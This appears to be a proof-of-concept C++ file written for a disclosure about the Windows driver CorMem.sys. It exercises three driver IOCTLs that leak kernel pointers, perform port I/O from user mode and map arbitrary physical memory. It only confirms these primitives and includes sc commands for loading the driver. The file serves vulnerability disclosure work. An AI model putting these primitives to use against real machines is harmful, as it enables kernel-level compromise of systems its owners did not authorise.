// poc_cormem.cpp - proves the CorMem.sys primitives without trashing anything.
//
// three checks, in increasing order of severity:
//   1. 0x222008  - driver hands out its own kernel function pointers
//   2. 0x222014/18 - port io, read the RTC seconds register twice, expect +1
//   3. 0x22200C  - map the fixed physical page 0xFFDF0000 (backs KUSER_SHARED_DATA
//                  at 0x7FFE0000). if the driver maps it, that's arbitrary phys.
//
// needs admin + the driver running:
//   sc create CorMem type= kernel binPath= C:\path\to\CorMem.sys
//   sc start CorMem
//   poc.exe
//   sc stop CorMem && sc delete CorMem
//
// built for the disclosure writeup. test on your own box only.

#include <cstdio>
#include "cormem.h"

int main() {
    CorMemDriver drv;
    if (!drv.open()) {
        wprintf(L"open failed, GLE=%lu. driver installed and started?\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] \\\\.\\CORMEM opened\n");

    // 1. pointer table
    CORMEM_FUNC_TABLE tbl{};
    if (drv.get_funcs(tbl) && tbl.count) {
        wprintf(L"[+] func table: %u kernel pointers, [0]=%p\n",
                tbl.count, (void*)tbl.funcs[0]);
    } else {
        wprintf(L"[-] func table failed, GLE=%lu\n", GetLastError());
    }

    // 2. port io via RTC
    uint8_t s1 = drv.rtc_read(0x00);
    Sleep(1100);
    uint8_t s2 = drv.rtc_read(0x00);
    wprintf(L"[+] rtc seconds 0x%02X -> 0x%02X (BCD, expect +1)\n", s1, s2);
    if (s1 != s2)
        wprintf(L"[+] ring-0 port io from user mode confirmed\n");
    else
        wprintf(L"[!] no tick - either instant re-read or port io refused\n");

    // 3. arbitrary physical map. two views of the same page, both should differ
    uint64_t kva1 = drv.map_phys(0xFFDF0000);
    uint64_t kva2 = drv.map_phys(0xFFDF0000);
    if (kva1 && kva2) {
        wprintf(L"[+] KUSER_SHARED_DATA phys page mapped twice:\n");
        wprintf(L"    view 1 = %016llX\n    view 2 = %016llX\n", kva1, kva2);
        wprintf(L"[+] arbitrary physical memory mapping confirmed\n");
    } else {
        wprintf(L"[-] phys map failed, GLE=%lu\n", GetLastError());
    }

    return 0;
}
